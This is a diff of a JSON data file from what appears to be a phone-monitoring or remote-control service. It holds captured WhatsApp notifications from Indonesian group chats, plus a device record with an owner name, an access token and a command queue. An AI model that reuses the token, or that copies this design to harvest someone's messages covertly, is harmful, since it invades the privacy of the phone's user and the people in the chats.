@@ -22,6 +22,30 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (414 pesan): ~ 𝟒𝐈𝐒𝐈𝐒 | 𝐌𝐩𝐞𝐥\"𝐬",
+        "content": "Join sini",
+        "time": "29/04 22:08",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777471034890
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2250 pesan dari 20 chat",
+        "time": "29/04 22:08",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777471032100
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (245 pesan): ~ 赵 || ⤹⤹zll!a ⃘֟",
+        "content": "💟 Stiker",
+        "time": "29/04 22:08",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777471032013
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "WhatsApp",
         "content": "‎‎2251 pesan dari 20 chat",
         "time": "29/04 22:08",
@@ -3995,30 +4019,6 @@
         "time": "29/04 22:02",
         "pkg": "com.whatsapp",
         "receivedAt": 1777470692775
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎2088 pesan dari 20 chat",
-        "time": "29/04 22:02",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777470692692
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎2087 pesan dari 20 chat",
-        "time": "29/04 22:02",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777470691114
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (207 pesan): ~ qɪs†/𝐂𝟗/𝐑𝐎𝐑/𝟐𝟐𝟓/𝟔𝟒𝟏/@𝙻𝚂𝚃𝙲",
-        "content": "💟 Stiker",
-        "time": "29/04 22:02",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777470691091
       }
     ],
     "galleryPhotos": [],
@@ -17949,7 +17949,7 @@
     "deviceName": "HP-ZAL7SEX-5D7C",
     "ownerUsername": "Zal7Sex",
     "token": "b806a84b0d2764047b5cb1e5906b7b55",
-    "lastSeen": 1777471031357,
+    "lastSeen": 1777471034134,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T13:43:11.417Z",
